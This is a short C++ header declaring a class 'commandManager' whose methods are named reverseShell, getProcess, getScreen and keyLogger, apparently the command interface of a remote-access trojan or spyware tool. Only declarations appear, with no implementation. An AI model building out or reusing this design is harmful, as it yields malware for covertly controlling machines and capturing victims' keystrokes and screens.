#pragma once
#include <string>
class commandManager
{
//private:

public:
	commandManager();
	std::string reverseShell(const char* cmd);
	void getProcess();
	bool getScreen(LPCSTR fname);
	void keyLogger();
};

